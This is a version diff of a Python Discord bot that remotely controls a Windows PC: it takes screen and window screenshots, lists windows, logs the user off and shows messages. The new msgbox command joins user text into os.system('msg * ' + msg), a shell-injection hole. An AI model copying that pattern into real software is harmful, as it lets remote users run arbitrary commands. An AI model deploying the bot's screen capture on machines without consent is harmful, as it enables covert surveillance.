@@ -1,4 +1,4 @@
-#TDRCB v1.2
+#TDRCB v1.3
 
 import discord
 from discord.ext import commands
@@ -14,7 +14,7 @@ from datetime import datetime
 import subprocess
 from tkinter import messagebox
 
-version = "1.2" #edit this on new updates, will be displayed in the /about command
+version = "1.3" #edit this on new updates, will be displayed in the /about command
 
 intents = discord.Intents.all()
 
@@ -54,9 +54,9 @@ async def restart(interaction: discord.Interaction):
     
 @bot.tree.command(name = 'screenshot', description = 'Takes a screenshot of the whole screen')
 async def screenshot(interaction: discord.Interaction):
-    im2 = pyautogui.screenshot('screenshot.png')
-    await interaction.response.send_message(file=discord.File('screenshot.png'))
-    os.remove('screenshot.png')
+    im2 = pyautogui.screenshot(os.getenv('USERPROFILE') + r'\screenshot.png')
+    await interaction.response.send_message(file=discord.File(os.getenv('USERPROFILE') + r'\screenshot.png'))
+    os.remove(os.getenv('USERPROFILE') + r'\screenshot.png')
 
 @bot.tree.command(name = 'tasklist', description = 'Shows all the open windows')
 async def tasklist(interaction: discord.Interaction):
@@ -96,12 +96,12 @@ async def screenshotwindow(interaction: discord.Interaction, *, title:str):
         window = pygetwindow.getWindowsWithTitle(title)[0]
         left, top = window.topleft
         right, bottom = window.bottomright
-        pyautogui.screenshot ("screenshotwindow.png")
-        im = Image.open ("screenshotwindow.png")
+        pyautogui.screenshot (os.getenv('USERPROFILE') + r'\screenshotwindow.png')
+        im = Image.open (os.getenv('USERPROFILE') + r'\screenshotwindow.png')
         im = im.crop((left, top, right, bottom))
-        im.save("screenshotwindow.png")
-        await interaction.response.send_message(file=discord.File('screenshotwindow.png'))
-        os.remove('screenshotwindow.png')
+        im.save(os.getenv('USERPROFILE') + r'\screenshotwindow.png')
+        await interaction.response.send_message(file=discord.File(os.getenv('USERPROFILE') + r'\screenshotwindow.png'))
+        os.remove(os.getenv('USERPROFILE') + r'\screenshotwindow.png')
     except:
         await interaction.response.send_message(":x: Error getting the window, it might not exist")
 
@@ -250,9 +250,9 @@ async def logoff(interaction: discord.Interaction):
     await interaction.response.send_message('Logging off...')
     os.system('logoff')
 
-@bot.tree.command(name = 'msgbox', description = 'Shows a message box.')
+@bot.tree.command(name = 'msgbox', description = 'Shows a message box. (Only on Pro editions of Windows)')
 async def msgbox(interaction: discord.Interaction, *, msg:str):
-    messagebox.showinfo(title = 'TDRCB Message Box', messsage = msg)
+    os.system('msg * ' + msg)
     await interaction.response.send_message('Message box appeared.')
 
 @bot.tree.command(name = "about", description = "About")
